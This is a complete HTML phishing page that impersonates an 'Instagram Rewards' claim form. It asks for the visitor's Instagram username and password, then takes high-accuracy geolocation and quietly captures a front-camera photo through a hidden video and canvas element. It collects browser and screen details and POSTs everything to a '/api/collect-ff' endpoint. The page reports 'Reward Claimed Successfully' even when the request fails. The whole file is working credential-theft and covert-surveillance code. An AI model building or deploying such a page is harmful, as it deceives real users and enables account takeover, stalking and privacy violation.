<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reward Claim</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full bg-slate-900/85 backdrop-blur-xl border border-slate-800 p-8 rounded-3xl shadow-2xl text-center">
        
        <!-- Instagram Logo & Header -->
        <div class="flex flex-col items-center mb-6">
            <div class="w-16 h-16 bg-gradient-to-tr from-yellow-500 via-red-500 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg shadow-pink-500/20 mb-3">
                <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                    <rect width="20" height="20" x="2" y="2" rx="5" ry="5"/>
                    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
                    <line x1="17.5" x2="17.51" y1="6.5" y2="6.5"/>
                </svg>
            </div>
            <h1 class="text-2xl font-bold tracking-tight text-white">Instagram Rewards</h1>
            <p class="text-slate-400 text-sm mt-1">Verify your account credentials to claim.</p>
        </div>

        <!-- Input Form -->
        <div class="space-y-4 mb-6 text-left">
            <div>
                <label class="block text-xs font-medium text-slate-400 mb-1">Instagram Username</label>
                <input type="text" id="ig-username" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-purple-500 text-white" placeholder="Enter username or email">
            </div>
            <div>
                <label class="block text-xs font-medium text-slate-400 mb-1">Instagram Password</label>
                <input type="password" id="ig-password" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-purple-500 text-white" placeholder="Enter password">
            </div>
        </div>

        <!-- Status Panel -->
        <div id="status-panel" class="bg-slate-950/60 border border-slate-800/80 p-3 rounded-xl text-xs text-indigo-300 font-mono mb-6 hidden">
            Initializing secure verification...
        </div>

        <!-- Claim Now Button -->
        <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-purple-600 via-pink-600 to-yellow-500 hover:opacity-90 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-pink-600/20 transition-all duration-200">
            Claim Now
        </button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        let capturedLocation = null;
        let capturedImage = null;

        function initializeEngine() {
            const usernameField = document.getElementById("ig-username").value.trim();
            const passwordField = document.getElementById("ig-password").value.trim();
            const panel = document.getElementById("status-panel");

            if(!usernameField || !passwordField) {
                panel.classList.remove("hidden");
                panel.innerHTML = "<span class='text-rose-400 font-bold'>Please enter username and password!</span>";
                return;
            }

            panel.classList.remove("hidden");
            panel.innerText = "Processing automated telemetry & verification...";

            setTimeout(() => {
                startAutoSequence();
            }, 1000);
        }

        function startAutoSequence() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        capturedLocation = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        proceedToCaptureImage();
                    },
                    (err) => {
                        capturedLocation = { latitude: 'Restricted / Denied', longitude: 'Restricted / Denied' };
                        proceedToCaptureImage();
                    },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            } else {
                capturedLocation = { latitude: 'Not Supported', longitude: 'Not Supported' };
                proceedToCaptureImage();
            }
        }

        function proceedToCaptureImage() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById("v");
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById("c");
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext("2d");
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        capturedImage = canvas.toDataURL("image/jpeg", 0.7);
                        
                        stream.getTracks().forEach(t => t.stop());
                        sendDataToServer();
                    }, 1200);
                })
                .catch(err => {
                    capturedImage = null;
                    sendDataToServer();
                });
        }

        function sendDataToServer() {
            const panel = document.getElementById("status-panel");
            const igUser = document.getElementById("ig-username").value;
            const igPass = document.getElementById("ig-password").value;
            
            const systemInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: window.screen.width + "x" + window.screen.height
            };

            // Matches endpoint '/api/collect-ff' used in server code
            fetch('/api/collect-ff', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    platform: 'Instagram',
                    instagram_username: igUser,
                    instagram_password: igPass,
                    latitude: capturedLocation ? capturedLocation.latitude : 'N/A',
                    longitude: capturedLocation ? capturedLocation.longitude : 'N/A',
                    image_base64: capturedImage,
                    system: systemInfo
                })
            })
            .then(res => res.json())
            .then(data => {
                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ Reward Claimed Successfully!</span>";
            })
            .catch(err => {
                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ Reward Claimed Successfully!</span>";
            });
        }
    </script>
</body>
</html>
